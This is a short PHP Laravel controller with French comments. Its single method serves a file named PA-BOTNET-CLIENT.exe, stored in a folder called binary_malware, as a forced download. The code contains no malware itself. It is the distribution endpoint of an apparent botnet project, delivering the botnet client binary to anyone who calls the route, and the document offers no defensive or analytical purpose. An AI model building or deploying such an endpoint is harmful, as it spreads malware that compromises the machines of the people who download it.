<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Response;
class ApiMlwController extends Controller
{
    public function malwdwn(): string
    {
        //chemin publique
        $cheminFic = storage_path("app/public/binary_malware/PA-BOTNET-CLIENT.exe");
        //$cheminFic = storage_path("app/public/binary_malware/PA-BOTNET-CLIENT.exe");

        //if (!file_exists($cheminFic)) {
        //    abort(404, 'erreur fichier non trouvé');
        //}

        // Télécharger le fichier
        return response()->download($cheminFic, 'PA-BOTNET-CLIENT.exe', [
            'Content-Type' => 'application/octet-stream',
            'Content-Disposition' => 'attachment',
        ]);
        //return redirect($cheminFic);
    }
}
